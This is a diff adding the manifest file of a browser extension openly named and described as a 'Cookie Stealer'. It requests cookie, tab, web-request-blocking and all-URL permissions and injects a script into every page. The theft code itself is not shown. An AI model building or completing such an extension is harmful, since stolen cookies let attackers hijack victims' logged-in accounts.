@@ -1,0 +1,30 @@
+{
+    "name": "Cookie Stealer",
+    "version": "1.0",
+    "description": "A Cookie Stealer",
+    "manifest_version": 2,
+    "icons": {
+        "48": "icon.png"
+      },
+    "browser_action" : {
+        "default_icon": "icon.png",
+        "default_popup": "popup.html"
+    },
+    "background": {
+        "scripts": ["background.js"]
+    },
+    "permissions": [
+        "activetab",
+        "tabs",
+        "cookies",
+        "http://*/*",
+        "https://*/*",
+        "webRequest",
+        "webRequestBlocking",
+        "<all_urls>"
+    ],
+    "content_scripts": [ {
+        "js": ["background.js"],
+        "matches": [ "http://*/*","https://*/*"]
+     } ]
+}
